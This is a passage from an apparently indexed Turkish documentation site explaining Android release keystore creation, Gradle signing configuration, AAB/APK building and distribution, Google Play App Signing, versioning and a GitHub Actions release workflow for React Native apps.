alias)\n\u251c\u2500\u2500 todo-app/\n\u2502   \u251c\u2500\u2500 todo-app-upload-key.keystore\n\u2502   \u2514\u2500\u2500 keystore-info.txt\n\u2514\u2500\u2500 fitness-app/\n    \u251c\u2500\u2500 fitness-app-upload-key.keystore\n    \u2514\u2500\u2500 keystore-info.txt\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Her uygulama i\u00e7in ayr\u0131 klas\u00f6r</li> <li>Keystore ad\u0131nda uygulama ad\u0131 olsun</li> <li>\u015eifreleri <code>keystore-info.txt</code> dosyas\u0131nda sakla (\u015fifreli cloud'da)</li> </ul>"},{"location":"keystore/#2-keystore-olusturma","title":"2. Keystore Olu\u015fturma \ud83d\udee0\ufe0f","text":""},{"location":"keystore/#21-gereksinimler","title":"2.1. Gereksinimler","text":"<pre><code># Java JDK kurulu olmal\u0131 (React Native s\u00fcr\u00fcm\u00fcn\u00fcze uygun)\njava -version\n\n# keytool komutu JDK ile gelir\nkeytool -version\n</code></pre> <p>[!IMPORTANT] JDK S\u00fcr\u00fcm Uyumlulu\u011fu:</p> <ul> <li>React Native 0.73+: JDK 17 (\u00f6nerilen)</li> <li>React Native 0.68-0.72: JDK 11 veya 17</li> <li>Eski versiyonlar: JDK 8 veya 11</li> </ul> <p>Yanl\u0131\u015f JDK s\u00fcr\u00fcm\u00fc build hatalar\u0131na neden olur!</p>"},{"location":"keystore/#22-keystore-olusturma-komutu","title":"2.2. Keystore Olu\u015fturma Komutu","text":"<pre><code># Proje root dizininde\ncd android/app\n\n# Keystore olu\u015ftur (\u00d6NER\u0130LEN)\nkeytool -genkeypair -v \\\n  -storetype PKCS12 \\\n  -keystore my-upload-key.keystore \\\n  -alias my-key-alias \\\n  -keyalg RSA \\\n  -keysize 2048 \\\n  -validity 10000 \\\n  -sigalg SHA256withRSA\n</code></pre> <p>Parametreler:</p> <ul> <li><code>-storetype PKCS12</code>: Modern keystore format\u0131 (\u00f6nerilen)</li> <li><code>-keystore my-upload-key.keystore</code>: Keystore dosya ad\u0131</li> <li><code>-alias my-key-alias</code>: Key alias (hat\u0131rlay\u0131n!)</li> <li><code>-keyalg RSA</code>: Algoritma</li> <li><code>-keysize 2048</code>: Key boyutu</li> <li><code>-validity 10000</code>: Ge\u00e7erlilik s\u00fcresi (g\u00fcn) - Minimum 25 y\u0131l gerekli!</li> <li><code>-sigalg SHA256withRSA</code>: \u0130mza algoritmas\u0131 (uyumluluk i\u00e7in)</li> </ul> <p>[!CAUTION] validity Parametresi Kritik: Google Play, sertifikan\u0131n en az 22 Ekim 2033 tarihine kadar ge\u00e7erli olmas\u0131n\u0131 \u015fart ko\u015far. 10000 g\u00fcnden (27 y\u0131l) az verilirse ileride g\u00fcncelleme sorunu ya\u015fanabilir!</p>"},{"location":"keystore/#23-istenecek-bilgiler","title":"2.3. \u0130stenecek Bilgiler","text":"<pre><code>Enter keystore password: ********\nRe-enter new password: ********\n\nWhat is your first and last name?\n  [Unknown]:  John Doe\n\nWhat is the name of your organizational unit?\n  [Unknown]:  Development\n\nWhat is the name of your organization?\n  [Unknown]:  MyCompany\n\nWhat is the name of your City or Locality?\n  [Unknown]:  Istanbul\n\nWhat is the name of your State or Province?\n  [Unknown]:  Istanbul\n\nWhat is the two-letter country code for this unit?\n  [Unknown]:  TR\n\nIs CN=John Doe, OU=Development, O=MyCompany, L=Istanbul, ST=Istanbul, C=TR correct?\n  [no]:  yes\n\nEnter key password for &lt;my-key-alias&gt;\n        (RETURN if same as keystore password): ********\n</code></pre> <p>[!IMPORTANT] \u015eifreleri Kaydedin:</p> <ul> <li>Keystore password</li> <li>Key alias</li> <li>Key password</li> </ul> <p>Bu bilgileri g\u00fcvenli bir yerde (password manager) saklay\u0131n!</p>"},{"location":"keystore/#3-keystoreu-guvenli-saklama","title":"3. Keystore'u G\u00fcvenli Saklama \ud83d\udd12","text":""},{"location":"keystore/#31-gitignorea-ekleyin","title":"3.1. .gitignore'a Ekleyin","text":"<pre><code># android/app/.gitignore\n*.keystore\n*.jks\n</code></pre>"},{"location":"keystore/#32-yedekleme","title":"3.2. Yedekleme","text":"<pre><code># Keystore'u g\u00fcvenli bir yere yedekleyin\n# \u00d6rnek: \u015eifreli cloud storage, password manager\n\n# \u00d6NEML\u0130: Birden fazla yerde yedek tutun!\n# - Cloud storage (\u015fifreli)\n# - External hard drive\n# - Password manager\n</code></pre>"},{"location":"keystore/#33-keystore-bilgilerini-saklama","title":"3.3. Keystore Bilgilerini Saklama","text":"<p>gradle.properties (local):</p> <pre><code># android/gradle.properties (GIT'E EKLEMEY\u0130N!)\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\nMYAPP_UPLOAD_KEY_ALIAS=my-key-alias\nMYAPP_UPLOAD_STORE_PASSWORD=your_keystore_password\nMYAPP_UPLOAD_KEY_PASSWORD=your_key_password\n</code></pre> <p>[!WARNING] <code>gradle.properties</code> dosyas\u0131n\u0131 asla Git'e eklemeyin!</p>"},{"location":"keystore/#4-gradle-konfigurasyonu","title":"4. Gradle Konfig\u00fcrasyonu \u2699\ufe0f","text":""},{"location":"keystore/#41-androidappbuildgradle-hibrit-yaklasm","title":"4.1. android/app/build.gradle (Hibrit Yakla\u015f\u0131m)","text":"<pre><code>android {\n    ...\n    defaultConfig { ... }\n\n    // Signing configs (Env Vars &gt; gradle.properties)\n    signingConfigs {\n        debug {\n            storeFile file('debug.keystore')\n            storePassword 'android'\n            keyAlias 'androiddebugkey'\n            keyPassword 'android'\n        }\n        release {\n            // \u00d6ncelik: Environment Variables -&gt; gradle.properties\n            def keystoreFile = System.getenv(\"MYAPP_UPLOAD_STORE_FILE\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_FILE\")\n            def keystorePassword = System.getenv(\"MYAPP_UPLOAD_STORE_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_PASSWORD\")\n            def keyAlias = System.getenv(\"MYAPP_UPLOAD_KEY_ALIAS\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_ALIAS\")\n            def keyPassword = System.getenv(\"MYAPP_UPLOAD_KEY_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_PASSWORD\")\n\n            if (keystoreFile) {\n                storeFile file(keystoreFile)\n                storePassword keystorePassword\n                keyAlias keyAlias\n                keyPassword keyPassword\n            }\n        }\n    }\n\n    buildTypes {\n        debug {\n            signingConfig signingConfigs.debug\n        }\n        release {\n            // Proguard/R8 minification\n            minifyEnabled true\n            shrinkResources true\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n\n            // Signing\n            signingConfig signingConfigs.release\n        }\n    }\n}\n</code></pre> <p>[!TIP] Hibrit Yakla\u015f\u0131m Avantajlar\u0131:</p> <ul> <li>Local development: <code>gradle.properties</code> kullan\u0131r</li> <li>CI/CD: Environment variables kullan\u0131r (daha g\u00fcvenli)</li> <li><code>gradle.properties</code> dosyas\u0131 olu\u015fturmaya gerek kalmaz</li> </ul>"},{"location":"keystore/#42-proguardr8-rules-detayl","title":"4.2. ProGuard/R8 Rules (Detayl\u0131)","text":"<pre><code># android/app/proguard-rules.pro\n\n# ===== React Native Core =====\n-keep class com.facebook.react.** { *; }\n-keep class com.facebook.hermes.** { *; }\n-keep class com.facebook.jni.** { *; }\n\n# React Native Gesture Handler\n-keep class com.swmansion.gesturehandler.** { *; }\n\n# React Native Reanimated\n-keep class com.swmansion.reanimated.** { *; }\n\n# ===== Retrofit (API Calls) =====\n-keepattributes Signature\n-keepattributes *Annotation*\n-keep class retrofit2.** { *; }\n-keepclasseswithmembers class * {\n    @retrofit2.http.* &lt;methods&gt;;\n}\n\n# ===== OkHttp =====\n-dontwarn okhttp3.**\n-dontwarn okio.**\n-keep class okhttp3.** { *; }\n-keep interface okhttp3.** { *; }\n\n# ===== Gson/JSON =====\n-keep class com.google.gson.** { *; }\n-keepclassmembers,allowobfuscation class * {\n  @com.google.gson.annotations.SerializedName &lt;fields&gt;;\n}\n\n# ===== Firebase =====\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n\n# ===== Your App Models =====\n-keep class com.yourapp.models.** { *; }\n-keep class com.yourapp.api.** { *; }\n\n# ===== General =====\n-keepattributes SourceFile,LineNumberTable\n-keepattributes *Annotation*\n-renamesourcefileattribute SourceFile\n</code></pre>"},{"location":"keystore/#5-release-apkaab-olusturma","title":"5. Release APK/AAB Olu\u015fturma \ud83d\udce6","text":""},{"location":"keystore/#51-aab-android-app-bundle-onerilen","title":"5.1. AAB (Android App Bundle) - \u00d6nerilen","text":"<pre><code># Proje root dizininde\ncd android\n\n# Release AAB olu\u015ftur\n./gradlew bundleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"keystore/#52-apk-alternative","title":"5.2. APK (Alternative)","text":"<pre><code># Release APK olu\u015ftur\n./gradlew assembleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"keystore/#53-build-temizleme","title":"5.3. Build Temizleme","text":"<pre><code># Cache temizle\n./gradlew clean\n\n# Sonra tekrar build\n./gradlew bundleRelease\n</code></pre>"},{"location":"keystore/#54-aab-vs-apk-hangisini-kullanmal","title":"5.4. AAB vs APK: Hangisini Kullanmal\u0131? \ud83e\udd14","text":"<p>[!IMPORTANT] Google Play: AAB zorunlu (2021'den beri) Di\u011fer platformlar: APK kullan\u0131labilir</p> <p>Kar\u015f\u0131la\u015ft\u0131rma:</p> \u00d6zellik AAB (Android App Bundle) APK (Android Package) Google Play \u2705 Zorunlu \u274c Art\u0131k kabul edilmiyor Dosya Boyutu \u2705 %35 daha k\u00fc\u00e7\u00fck \u274c Daha b\u00fcy\u00fck Optimizasyon \u2705 Cihaza \u00f6zel \u274c Evrensel Direkt Y\u00fckleme \u274c M\u00fcmk\u00fcn de\u011fil \u2705 M\u00fcmk\u00fcn F-Droid \u274c Desteklemiyor \u2705 Destekliyor GitHub Releases \u274c Kullan\u0131c\u0131 y\u00fckleyemez \u2705 Direkt indirip y\u00fckler <p>Ne Zaman AAB?</p> <ul> <li>\u2705 Google Play Store'a y\u00fckleme</li> <li>\u2705 Dosya boyutu \u00f6nemli</li> <li>\u2705 Otomatik optimizasyon istiyorsan\u0131z</li> </ul> <p>Ne Zaman APK?</p> <ul> <li>\u2705 Direkt kullan\u0131c\u0131lara da\u011f\u0131t\u0131m</li> <li>\u2705 F-Droid, APKPure gibi alternatif ma\u011fazalar</li> <li>\u2705 GitHub Releases</li> <li>\u2705 Kendi web sitenizden indirme</li> <li>\u2705 Beta test (Google Play d\u0131\u015f\u0131nda)</li> </ul>"},{"location":"keystore/#55-alternatif-dagtm-kanallar-apk","title":"5.5. Alternatif Da\u011f\u0131t\u0131m Kanallar\u0131 (APK)","text":""},{"location":"keystore/#1-f-droid-ack-kaynak-uygulamalar","title":"1. F-Droid (A\u00e7\u0131k Kaynak Uygulamalar)","text":"<p>F-Droid Nedir?</p> <ul> <li>A\u00e7\u0131k kaynak Android uygulamalar\u0131 i\u00e7in alternatif ma\u011faza</li> <li>Tamamen \u00fccretsiz ve reklams\u0131z</li> <li>Gizlilik odakl\u0131 (tracking yok)</li> <li>Kaynak kodu a\u00e7\u0131k olmal\u0131</li> </ul> <p>Nas\u0131l Yay\u0131nlan\u0131r?</p> <pre><code># 1. Uygulaman\u0131z\u0131 a\u00e7\u0131k kaynak yap\u0131n (GitHub)\n# 2. F-Droid'e ba\u015fvuru yap\u0131n\n# https://f-droid.org/docs/Inclusion_Policy/\n\n# 3. Metadata dosyas\u0131 olu\u015fturun\n# fdroiddata/metadata/com.yourapp.txt\n\n# 4. F-Droid build server'\u0131 APK'y\u0131 olu\u015fturur\n# (Sizin keystore'unuz kullan\u0131lmaz, F-Droid'in kendi keystore'u)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 Tamamen \u00fccretsiz</li> <li>\u2705 Gizlilik odakl\u0131 kullan\u0131c\u0131lar</li> <li>\u2705 Otomatik g\u00fcncellemeler</li> <li>\u2705 Google Play'e alternatif</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Kaynak kodu a\u00e7\u0131k olmal\u0131</li> <li>\u274c F-Droid kendi keystore'u kullan\u0131r (Google Play ile ayn\u0131 APK de\u011fil)</li> <li>\u274c \u0130nceleme s\u00fcreci uzun (haftalar)</li> </ul>"},{"location":"keystore/#2-github-releases-en-kolay","title":"2. GitHub Releases (En Kolay)","text":"<p>Nas\u0131l Yap\u0131l\u0131r?</p> <pre><code># 1. Release APK olu\u015ftur\ncd android &amp;&amp; ./gradlew assembleRelease\n\n# 2. GitHub'da release olu\u015ftur\n# Repository \u2192 Releases \u2192 Create new release\n\n# 3. APK'y\u0131 upload et\n# Tag: v1.0.0\n# Title: Version 1.0.0\n# Description: Release notes\n# Assets: app-release.apk (upload)\n\n# 4. Publish release\n</code></pre> <p>Kullan\u0131c\u0131 \u0130ndirme:</p> <pre><code>https://github.com/yourname/yourapp/releases/latest\n\u2192 app-release.apk indir\n\u2192 Cihaza y\u00fckle (Unknown sources aktif olmal\u0131)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 \u00c7ok kolay</li> <li>\u2705 \u00dccretsiz</li> <li>\u2705 Versiyon kontrol\u00fc</li> <li>\u2705 Changelog ekleyebilirsin</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Otomatik g\u00fcncelleme yok</li> <li>\u274c Kullan\u0131c\u0131 \"Unknown sources\" aktif etmeli</li> <li>\u274c Google Play kadar g\u00fcvenilir de\u011fil (kullan\u0131c\u0131 g\u00f6z\u00fcnde)</li> </ul>"},{"location":"keystore/#3-apkpure-apkmirror","title":"3. APKPure / APKMirror","text":"<p>APKPure:</p> <ul> <li>\u00dc\u00e7\u00fcnc\u00fc parti APK ma\u011fazas\u0131</li> <li>Ba\u015fvuru: https://apkpure.com/developer</li> <li>\u00dccretsiz</li> </ul> <p>APKMirror:</p> <ul> <li>Sadece pop\u00fcler uygulamalar</li> <li>Ba\u015fvuru: https://www.apkmirror.com/apk-upload/</li> </ul>"},{"location":"keystore/#4-kendi-web-siteniz","title":"4. Kendi Web Siteniz","text":"<p>Basit Y\u00f6ntem:</p> <pre><code>&lt;!-- index.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;MyApp Download&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Download MyApp&lt;/h1&gt;\n    &lt;a href=\"app-release.apk\" download&gt;\n      &lt;button&gt;Download APK (v1.0.0)&lt;/button&gt;\n    &lt;/a&gt;\n\n    &lt;h2&gt;Installation:&lt;/h2&gt;\n    &lt;ol&gt;\n      &lt;li&gt;Download APK&lt;/li&gt;\n      &lt;li&gt;Settings \u2192 Security \u2192 Enable \"Unknown sources\"&lt;/li&gt;\n      &lt;li&gt;Open APK file&lt;/li&gt;\n      &lt;li&gt;Install&lt;/li&gt;\n    &lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Hosting:</p> <ul> <li>GitHub Pages (\u00fccretsiz)</li> <li>Netlify (\u00fccretsiz)</li> <li>Vercel (\u00fccretsiz)</li> <li>Kendi sunucunuz</li> </ul>"},{"location":"keystore/#5-samsung-galaxy-store","title":"5. Samsung Galaxy Store","text":"<p>Samsung cihazlar i\u00e7in alternatif:</p> <ul> <li>https://seller.samsungapps.com/</li> <li>APK kabul ediyor (AAB de\u011fil)</li> <li>Samsung cihazlarda pre-installed</li> </ul>"},{"location":"keystore/#56-dagtm-stratejisi-onerisi","title":"5.6. Da\u011f\u0131t\u0131m Stratejisi \u00d6nerisi","text":"<p>\u00c7oklu Platform Stratejisi:</p> <pre><code>1. Google Play Store (AAB)\n   \u251c\u2500 Ana da\u011f\u0131t\u0131m kanal\u0131\n   \u251c\u2500 Otomatik g\u00fcncellemeler\n   \u2514\u2500 En geni\u015f kitle\n\n2. F-Droid (APK - a\u00e7\u0131k kaynak)\n   \u251c\u2500 Gizlilik odakl\u0131 kullan\u0131c\u0131lar\n   \u251c\u2500 A\u00e7\u0131k kaynak toplulu\u011fu\n   \u2514\u2500 Google-free cihazlar\n\n3. GitHub Releases (APK)\n   \u251c\u2500 Beta testerlar\n   \u251c\u2500 Erken eri\u015fim\n   \u2514\u2500 Geli\u015ftirici toplulu\u011fu\n\n4. Kendi Web Siteniz (APK)\n   \u251c\u2500 Direkt kontrol\n   \u251c\u2500 Analytics\n   \u2514\u2500 \u00d6zel landing page\n</code></pre> <p>\u00d6rnek Senaryo:</p> <pre><code># 1. Google Play i\u00e7in AAB\n./gradlew bundleRelease\n# \u2192 Play Console'a y\u00fckle\n\n# 2. F-Droid / GitHub / Web i\u00e7in APK\n./gradlew assembleRelease\n# \u2192 GitHub Releases'e y\u00fckle\n# \u2192 Web sitene y\u00fckle\n</code></pre> <p>[!TIP] Best Practice:</p> <ul> <li>Google Play: AAB (zorunlu)</li> <li>Di\u011fer her yer: APK</li> <li>Her ikisini de ayn\u0131 keystore ile imzala!</li> </ul>"},{"location":"keystore/#6-apkaab-test-etme","title":"6. APK/AAB Test Etme \ud83e\uddea","text":""},{"location":"keystore/#61-aabyi-apkya-cevirme-test-icin","title":"6.1. AAB'yi APK'ya \u00c7evirme (Test \u0130\u00e7in)","text":"<pre><code># bundletool indir\n# https://github.com/google/bundletool/releases\n\n# AAB'den APK olu\u015ftur\njava -jar bundletool.jar build-apks \\\n  --bundle=app-release.aab \\\n  --output=app-release.apks \\\n  --mode=universal\n\n# APK'y\u0131 extract et\nunzip app-release.apks -d output\n\n# Cihaza y\u00fckle\nadb install output/universal.apk\n</code></pre>"},{"location":"keystore/#62-imza-dogrulama","title":"6.2. \u0130mza Do\u011frulama","text":"<pre><code># APK imzas\u0131n\u0131 kontrol et\njarsigner -verify -verbose -certs app-release.apk\n\n# Detayl\u0131 bilgi\nkeytool -printcert -jarfile app-release.apk\n</code></pre>"},{"location":"keystore/#7-google-play-upload","title":"7. Google Play Upload \ud83d\ude80","text":""},{"location":"keystore/#71-play-consoleda-uygulama-olusturma","title":"7.1. Play Console'da Uygulama Olu\u015fturma","text":"<ol> <li>Google Play Console'a girin</li> <li>\"Create app\" t\u0131klay\u0131n</li> <li>Uygulama bilgilerini doldurun</li> <li>\"Create app\" t\u0131klay\u0131n</li> </ol>"},{"location":"keystore/#72-aab-upload","title":"7.2. AAB Upload","text":"<ol> <li>Production &gt; Releases &gt; Create new release</li> <li>AAB dosyas\u0131n\u0131 upload edin</li> <li>Release notes ekleyin</li> <li>Review release &gt; Start rollout to production</li> </ol>"},{"location":"keystore/#73-app-signing-by-google-play-onerilen","title":"7.3. App Signing by Google Play (\u00d6nerilen)","text":"<p>[!CAUTION] ZORUNLU HALE GEL\u0130YOR (2025): Google Play App Signing, 2025 sonuna kadar t\u00fcm yeni uygulamalar i\u00e7in zorunlu olacak! Mevcut uygulamalar i\u00e7in de \u015fiddetle \u00f6nerilir.</p> <p>[!TIP] Google Play App Signing kullanman\u0131z \u00f6nerilir:</p> <ul> <li>Google, keystore'unuzu y\u00f6netir</li> <li>Keystore kayb\u0131 riski ortadan kalkar</li> <li>Upload key ile signing key ayr\u0131l\u0131r</li> </ul> <p>Nas\u0131l Aktif Edilir:</p> <ol> <li>Play Console &gt; Setup &gt; App signing</li> <li>Use Google Play App Signing se\u00e7in</li> <li>Upload key'inizi y\u00fckleyin</li> </ol> <p>Upload Key vs Signing Key:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      Sen        \u2502    \u2502   Google Play    \u2502    \u2502   Kullan\u0131c\u0131     \u2502\n\u2502  Upload Key     \u2502 \u2500\u2500\u25ba\u2502  Signing Key     \u2502 \u2500\u2500\u25ba\u2502   \u0130ndirir       \u2502\n\u2502   (senin)       \u2502    \u2502  (Google'\u0131n)     \u2502    \u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Farklar:</p> \u00d6zellik Upload Key Signing Key Sahibi Sen olu\u015fturursun Google saklar Kullan\u0131m AAB'yi Google'a y\u00fcklerken Cihazlara da\u011f\u0131t\u0131rken Kaybedilirse \u2705 Yenilenebilir \u274c Google saklar, sorun yok G\u00fcvenlik Senin sorumlulu\u011fun Google'\u0131n sorumlulu\u011fu <p>[!TIP] Mevcut Uygulamay\u0131 App Signing'e Ta\u015f\u0131ma:</p> <p>E\u011fer daha \u00f6nce App Signing olmadan yay\u0131nlad\u0131ysan\u0131z:</p> <ol> <li>Play Console \u2192 Setup \u2192 App signing</li> <li>\"Use a different key\" se\u00e7</li> <li>PEPK tool ile mevcut keystore'u export et:</li> </ol> <pre><code>java -jar pepk.jar \\\n  --keystore=my-upload-key.keystore \\\n  --alias=my-key-alias \\\n  --output=encrypted_private_key.zip \\\n  --encryptionkey=GOOGLE_PROVIDED_KEY\n</code></pre> <ol> <li><code>encrypted_private_key.zip</code>'i upload et</li> </ol>"},{"location":"keystore/#74-apk-imza-semalar-v1v2v3","title":"7.4. APK \u0130mza \u015eemalar\u0131 (V1/V2/V3)","text":"<p>\u0130mza \u015eemalar\u0131:</p> \u015eema Android A\u00e7\u0131klama V1 (JAR) T\u00fcm\u00fc Eski y\u00f6ntem, yava\u015f do\u011frulama V2 7.0+ APK Signature Scheme v2 V3 9.0+ Key rotation deste\u011fi V4 11+ Incremental installs <p>Gradle Konfig\u00fcrasyonu:</p> <pre><code>// android/app/build.gradle\nandroid {\n    signingConfigs {\n        release {\n            // ... (keystore config)\n\n            // \u0130mza \u015femalar\u0131n\u0131 aktif et\n            v1SigningEnabled true\n            v2SigningEnabled true\n            enableV3Signing true  // Key rotation (API 28+)\n            enableV4Signing true  // Incremental installs (API 30+)\n        }\n    }\n}\n</code></pre> <p>[!NOTE] V3/V4 Signing:</p> <ul> <li><code>enableV3Signing</code>: Key rotation deste\u011fi (Android 9.0+)</li> <li><code>enableV4Signing</code>: Incremental updates (Android 11+)</li> <li>Her ikisi de performans art\u0131\u015f\u0131 sa\u011flar</li> </ul>"},{"location":"keystore/#8-version-yonetimi","title":"8. Version Y\u00f6netimi \ud83d\udcc8","text":""},{"location":"keystore/#81-androidappbuildgradle","title":"8.1. android/app/build.gradle","text":"<pre><code>android {\n    defaultConfig {\n        applicationId \"com.yourapp\"\n        minSdkVersion 21\n        targetSdkVersion 34  // Google Play minimum requirement (2024+)\n\n        // Version Code (her release'de art\u0131r\u0131n)\n        versionCode 1\n\n        // Version Name (kullan\u0131c\u0131ya g\u00f6sterilen)\n        versionName \"1.0.0\"\n    }\n}\n</code></pre> <p>[!WARNING] Target SDK Zorunlulu\u011fu: Google Play, her y\u0131l\u0131n sonuna do\u011fru yeni uygulamalar ve g\u00fcncellemeler i\u00e7in <code>targetSdkVersion</code>'\u0131 y\u00fckseltmeyi zorunlu k\u0131lar.</p> <ul> <li>2024: Minimum API 34 (Android 14)</li> <li>2025: Muhtemelen API 35</li> </ul> <p>Eski targetSdk ile uygulama g\u00fcncellenemez!</p>"},{"location":"keystore/#82-version-artrma-stratejisi","title":"8.2. Version Art\u0131rma Stratejisi","text":"<pre><code>versionCode: 1, 2, 3, 4, ... (her release'de +1)\nversionName: \"1.0.0\", \"1.0.1\", \"1.1.0\", \"2.0.0\" (semantic versioning)\n</code></pre> <p>\u00d6rnek:</p> <ul> <li><code>1.0.0</code> \u2192 <code>1.0.1</code> (bug fix)</li> <li><code>1.0.1</code> \u2192 <code>1.1.0</code> (yeni \u00f6zellik)</li> <li><code>1.1.0</code> \u2192 <code>2.0.0</code> (breaking change)</li> </ul>"},{"location":"keystore/#9-cicd-entegrasyonu","title":"9. CI/CD Entegrasyonu \ud83d\udd04","text":""},{"location":"keystore/#91-github-actions-ornegi","title":"9.1. GitHub Actions \u00d6rne\u011fi","text":"<pre><code># .github/workflows/android-release.yml\nname: Android Release\n\non:\n  push:\n    tags:\n      - \"v*\"\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up JDK\n        uses: actions/setup-java@v4\n        with:\n          java-version: \"17\"\n          distribution: \"temurin\"\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: \"20\"\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Decode Keystore\n        run: |\n          echo \"${{ secrets.KEYSTORE_BASE64 }}\" | base64 -d &gt; android/app/my-upload-key.keystore\n\n      - name: Create gradle.properties\n        run: |\n          echo \"MYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_ALIAS=${{ secrets.KEY_ALIAS }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_STORE_PASSWORD=${{ secrets.KEYSTORE_PASSWORD }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_PASSWORD=${{ secrets.KEY_PASSWORD }}\" &gt;&gt; android/gradle.properties\n\n      - name: Build AAB\n        run: |\n          cd android\n          ./gradlew bundleRelease\n\n      - name: Upload AAB\n        uses: actions/upload-artifact@v4\n        with:\n          name: app-release.aab\n          path: android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"keystore/#92-github-secrets-ekleme","title":"9.2. GitHub Secrets Ekleme","text":"<pre><code># Keystore'u base64'e \u00e7evir\nbase64 -i android/app/my-upload-key.keystore | pbcopy\n\n# GitHub &gt; Settings &gt; Secrets &gt; Actions &gt; New repository secret\n# KEYSTORE_BASE64: (paste)\n# KEY_ALIAS: my-key-alias\n# KEYSTORE_PASSWORD: your_password\n# KEY_PASSWORD: your_password\n</code></pre>"},{"location":"keystore/#10-troubleshooting","title":"10. Troubleshooting \ud83d\udd0d","text":""},{"location":"keystore/#101-yaygn-hatalar","title":"10.1. Yayg\u0131n Hatalar","text":"<p>Hata: \"Failed to read key\"</p> <pre><code># \u00c7\u00f6z\u00fcm: \u015eifreleri kontrol edin\nkeytool -list -v -keystore my-upload-key.keystore\n</code></pre> <p>Hata: \"Keystore was tampered with\"</p> <pre><code># \u00c7\u00f6z\u00fcm: Keystore bozulmu\u015f, yedekten geri y\u00fckleyin\n</code></pre> <p>Hata: \"Upload key not found\"</p> <pre><code># \u00c7\u00f6z\u00fcm: gradle.properties dosyas\u0131n\u0131 kontrol edin\ncat android/gradle.properties\n</code></pre>"},{"location":"keystore/#102-keystore-bilgilerini-goruntuleme","title":"10.2. Keystore Bilgilerini G\u00f6r\u00fcnt\u00fcleme","text":"<pre><code># Keystore i\u00e7eri\u011fini listele\nkeytool -list -v -keystore my-upload-key.keystore\n\n# Alias'lar\u0131 g\u00f6ster\nkeytool -list -keystore my-upload-key.keystore\n\n# Sertifika detaylar\u0131\nkeytool -list -v -keystore my-upload-key.keystore -alias my-key-alias\n</code></pre>"},{"location":"keystore/#11-checklist-production-release","title":"11. Checklist: Production Release \ud83d\udccb","text":"<ul> <li>[ ] Keystore olu\u015fturuldu ve g\u00fcvenli yerde sakland\u0131</li> <li>[ ] Keystore \u015fifreleri kaydedildi (password manager)</li> <li>[ ] <code>.gitignore</code>'a <code>*.keystore</code> eklendi</li> <li>[ ] <code>gradle.properties</code> konfig\u00fcre edildi</li> <li>[ ] <code>build.gradle</code> signing config eklendi</li> <li>[ ] <code>versionCode</code> ve <code>versionName</code> g\u00fcncellendi</li> <li>[ ] ProGuard/R8 aktif (<code>minifyEnabled true</code>)</li> <li>[ ] Release AAB/APK build edildi</li> <li>[ ] \u0130mza do\u011fruland\u0131 (<code>jarsigner -verify</code>)</li> <li>[ ] Test cihaz\u0131nda \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131</li> <li>[ ] Google Play Console'da uygulama olu\u015fturuldu</li> <li>[ ] App Signing by Google Play aktif</li> <li>[ ] AAB upload edildi</li> <li>[ ] Release notes eklendi</li> </ul>"},{"location":"keystore/#12-guvenlik-best-practices","title":"12. G\u00fcvenlik Best Practices \ud83d\udd10","text":"<ol> <li>Keystore G\u00fcvenli\u011fi:</li> <li>Asla Git'e commit etmeyin</li> <li>Birden fazla yerde yedekleyin</li> <li> <p>\u015eifreli cloud storage kullan\u0131n</p> </li> <li> <p>\u015eifre Y\u00f6netimi:</p> </li> <li>G\u00fc\u00e7l\u00fc \u015fifreler kullan\u0131n (16+ karakter)</li> <li>Password manager kullan\u0131n</li> <li> <p>\u015eifreleri kimseyle payla\u015fmay\u0131n</p> </li> <li> <p>CI/CD:</p> </li> <li>Secrets'\u0131 environment variables olarak saklay\u0131n</li> <li>Base64 encode edin</li> <li> <p>Logs'da \u015fifreleri expose etmeyin</p> </li> <li> <p>Google Play App Signing:</p> </li> 